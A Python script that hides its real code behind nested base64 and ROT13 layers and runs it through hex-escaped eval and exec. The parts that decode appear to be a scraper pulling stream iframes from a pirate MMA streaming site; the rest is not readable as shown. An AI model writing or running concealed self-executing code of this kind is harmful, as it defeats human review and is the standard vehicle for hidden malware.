
import base64, codecs
thecrew = 'DQppbXBvcnQgYmFzZTY0LCBjb2RlY3MNCnRoZWNyZXcgPSAnYVcxd2IzSjBJSEpsY1hWbGMzUnpEUXBwYlhCdmNuUWdjbVVOQ21aeWIyMGdZbk0wSUdsdGNHOXlkQ0JDWldGMWRHbG1kV3hUYjNWd0RRcHBiWEJ2Y25RZ2MzbHpEUW9OQ21kaGJXVmZiR2x6ZENBOUlGdGREUW9OQ21SbFppQm5aWFJmWjJGdFpYTW9LVG9OQ2lBZ0lDQmhaMlZ1ZENBOUlDZE5iM3BwYkd4aEx6VXVNQ0FvVjJsdVpHOTNjeUJPVkNBMkxqRTdJRmRwYmpZME95QjROalFwSUVGd2NHeGxWMlZpUzJsMEx6VXpOeTR6TmlBb1MwaFVUVXdzSUd4cGEyVWdSMlZqYTI4cElFTm9jbTl0WlM4M05pNHdMak00TURrdU1UTXlJRk5oWm1GeWFTODFNemN1TXpZbkRRb2dJQ0FnYUhSdGJDQTlJSEpsY1hWbGMzUnpMbWRsZENnbmFIUjBjRG92TDJOeVlXTnJjM1J5WldGdGN5NWpiMjB2YlcxaGMzUnlaV0Z0Y3k4bkxHaGxZV1JsY25NOWV5ZDFjMlZ5TFdGblpXNTBKenBoWjJWdWRIMHBEUW9nSUNBZ2MyOTFjQ0E5SUVKbFlYVjBhV1oxYkZOdmRYQW9hSFJ0YkM1amIyNTBaVzUwTENkb2RHMXNMbkJoY25ObGNpY3BEUW9nSUNBZ1lTQTlJSE52ZFhBdVptbHVaRjloYkd3b0oyRW5MR05zWVhOelh6MTdKMkowYmlCaWRHNHRaR1ZtWVhWc2RDQmlkRzR0YkdjZ1luUnVMV0pzYjJOckozMHBEUW9nSUNBZ1ptOXlJR1JoZEdFZ2FXNGdZVG9OQ2lBZ0lDQWdJQ0FnZEdsMGJHVWdQU0JrWVhSaExtWnBibVFvSjJnMEp5eGpiR0Z6YzE4OWV5ZHRaV1InDQpkb2VzbnQgPSAnY0xGMWJNSlN4bko1YVczMGNZYUV5clVEQVB2TnRWUE50VlBOdHFUeTBvVEh0Q0ZPMG5LRWZNRjV5b3pBaU1USGJXMlNtTDJ5Y1dsamFuSnFobz'
doesnt = 'AKrIqfrRSDqx50IyOBqSMDGaEkIUxjo1EVqRATGmOhF0IzGHL1rR1XDJyAIRuvImAWZR12ZQEKoTcuoxcknT8mI3yKoUuOHUMBqSMDGaEJHR50GGWGM01WBJMhF0RjJKcGnaOHFJuAHUH3ImASL3SHn3yKoJZjoxgSMx1YZTAEETWOHUMBqSMDG2kAF0HkpUb0qR0lH2qAFGyzoxgOZSSRLxSDqxSdpUc5nUSDqJSAF0ImGGWGM01YJzWLEauOHUDjJUNmEJkAFyAaIyRjqRbkZRSDqQOLGIEWryMHpKykHmygpIIKrHkXZTWAZyAaGHM4AySRLaEJHR50GRckrJ9uEUEQEx5uE0b5Az5Xn2MZEwtkJKqBqSuGpJAirxIcpGAnqRq5EUEOqwEeDzkCF25XAQWOHJM0pySZZSuTG09jIH9zGHykrHk4M2AkHQtkJz1jnScgGUELHzqJFIVkJyyDG2MhFzq5IyWkrHjlM2yLEx9EoyIKnJ9XFTyOoHkbJyN0oHWEGwIMq1WgJaMCE0kXGKIjraucDHqnZ1y3JwWKnwOLIyOBqSMHqGOiFzc0D0MCoR1YHmSAF0RjpTj1LH1YETWKZaHjpIIBAyyfBKqjryA3owAOZUO6FKIiF1cbGQV5M1xlZJqZF0RjpUcWqJ9YJzyKoTgvGHcGrR1YI21QF2MupHgOrKO2ZKIAZxybpIOjAxkXpKyiLHH5JRDjJSMDGaEJIHScpHgBqRATG1OAFyZkpIE5raSXn0qiZ0ydJSE1ZT9XnzuZZwybpIEWnUSDnzShIHIao1N1nxkYI21AF1MuJRDaQDcxolN9VPpjF0yQDJqWE0IaHSAPrzVmIaqZoIcjLz1FMyyKrUAYD2EbFay4nzWUEacwZGt5MKyxnJEUATqMoyW1GSqFoScgEwSvFSSaJJ5FqHkKrT5WE0bjLzxknJWUBJcurJD5F1RjF0yQDJqWE1c2L2yPn1yLHzuWE2k1FHqSAxEEo2qWD0SaFHAOM0yVHaOxE3ufFHDjM1cUEwOMHmIgLIp1n0gQMT9BD2AmJGW4nTZmGzMDJUAhLyqJn2SKEKEuE1MbJxqfqIc5MQyYHmHjJyub'
do = 'MERRb2dJQ0FnSUNBZ0lIUnBkR3hsSUQwZ2RHbDBiR1V1Wlc1amIyUmxLQ2RoYzJOcGFTY3NKMmxuYm05eVpTY3BEUW9nSUNBZ0lDQWdJSFJwZEd4bElEMGdkR2wwYkdVdVpHVmpiMlJsS0NkMWRHWXRPQ2NzSjJsbmJtOXlaU2NwRFFvZ0lDQWdJQ0FnSUdsbUlHZGhiV1VnYVc0Z2RHbDBiR1U2RFFvZ0lDQWdJQ0FnSUNBZ0lDQjFjbXdnUFNCa1lYUmhXeWRvY21WbUoxME5DaUFnSUNBZ0lDQWdJQ0FnSUdoMGJXd2dQU0J5WlhGMVpYTjBjeTVuWlhRb2RYSnNMR2hsWVdSbGNuTTlleWQxYzJWeUxXRm5aVzUwSnpwaFoyVnVkSDBwTG1OdmJuUmxiblFOQ2lBZ0lDQWdJQ0FnSUNBZ0lITnZkWEFnUFNCQ1pXRjFkR2xtZFd4VGIzVndLR2gwYld3c0oyaDBiV3d1Y0dGeWMyVnlKeWtOQ2lBZ0lDQWdJQ0FnSUNBZ0lHWnlZVzFsSUQwZ2MyOTFjQzVtYVc1a0tDZHBabkpoYldVbktRMEtJQ0FnSUNBZ0lDQWdJQ0FnYVdZZ1puSmhiV1U2RFFvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnWicNCmRyYW1hID0gJ2FXdW9KSHRDRk96cHpTZ01JZmFwM1d3VzEwQVB2TnRWUE50VlBOdFZQTnRWUE50VlBPZ0xLQTBNS1Z0Q0ZPbE1LUzFNS0EwcGw1YU1LRGJNYVd1b0pIZm5USXVNVElscG0xN1czV3lNeklsTUtWYUJhSWxvVTBjWXpBaW9hRXlvYURBUHZOdFZQTnRWUE50VlBOdFZQTnRWUE9tbzNJalZRMHREekl1cUtFY01hSWZIMjkxcFB1Z0xLQTBNS1ZmVzJ1MG9KamhwVFNscDJJbFdseEFQdk50VlBOdFZQTnRWUE50VlBOdFZQT2daM0g0VlEwdHB6SGhMMjlncFR5Zk1GdGFwMjkxcHpBeUJ2TnZYUDRlQ2x4dldsa2xNRjVSRzFFT0dSamNZek1jb3pFdW9UamJwM0VsWFVBaXFLTmhwVVd5cV'
drama = 'ISL01urTALEQOLIyOBqSMDGaEJHR50IyOBqSMDGaEJIQOgpHq0qRATG2qnZ0t0Fz1CpISRLaEJHR50IyOBqSMDGaEJHR50IyOBqT9UDGSPHR45IyDjoKSUqUELoR5up1IKrH16FJkAF1L5I2kBMIMHGJkZFwS5HHEvqSMDGaEJHR50IyOBqSMDGaEJHR50pQASoR1XH2qMryAdpSEWnR1DqGqKZ0IwpIEerIqgLmOhF0IzGHMdLKNmEJkAFyAaI21wM1bmFQEmEauOHUMBqSMDGaEJHR50IyOBqSMDGaEJHR92pUcWqJ5dZSuJHR50IyOBqSMDGaEJHR50GHceoH1ULxSDqx50IyOBqSMDGaEJHR50IyOBqSMDG3Mjrxy1ozbjJSMDGaEJHR50IyOCrJ9IDKyPqQOLIyOBqSMDGaEJHR50IyOBqRjlBJukIUybpHcVDIO0ZSuJHR50IyIKrKSIFJkiqx9gpIIKrHkXZRSDqQ09Wj0XpzImpTIwqPN9VPqprQplKUt2Myk4AmEprQZkKUtmZlpAPaImLJ5xrJ91VQ0tMKMuoPtaKUt3ASk4AwuprQL1KUt2Z1k4AmWprQL1KUt3AlpcVPftMKMuoPtaKUt2Z1k4AzMprQL0KUt2AIk4AwAprQpmKUtlMIk4AwEprQL1KUt2Z1k4AzMprQL0KUt2AIk4ZwuprQL0KUt2Myk4AwIprQpmKUt2MIk4AmEprQWwKUtlZSk4AmWprQL1KUt3Z1k4AmOprQL1KUt2Z1k4AmEprQV5WlxtXlOyqzSfXPqprQL0KUt2MvpcVPftMKMuoPtaKUt2Z1k4AzMprQL0KUt2AIk4AwAprQpmKUtlMIk4AwEprQL1KUt2Z1k4AzMprQL0KUt2AIk4ZwuprQL0KUt3Zyk4AwSprQMxKUt2ZIk4ZzAprQVjKUt3Zyk4AwIprQpmKUt3ZSk4AwIprQLmKUt3ASk4ZwxaXD0XMKMuoPuwo21jnJkyXTWup2H2AP5vAwExMJAiMTHbMKMuoPtaKUt3AIk4AmAprQLkKUt2MIk4AwEprQp5KUt2Myk4AmHaXFxfWmkmqUWcozp+WljaMKuyLlpcXD=='
respect = '\x72\x6f\x74\x31\x33'
usandyou = eval('\x74\x68\x65\x63\x72\x65\x77') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x6f\x65\x73\x6e\x74\x2c\x20\x72\x65\x73\x70\x65\x63\x74\x29') + eval('\x64\x6f') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x72\x61\x6d\x61\x2c\x20\x72\x65\x73\x70\x65\x63\x74\x29')
eval(compile(base64.b64decode(eval('\x75\x73\x61\x6e\x64\x79\x6f\x75')),'<string>','exec'))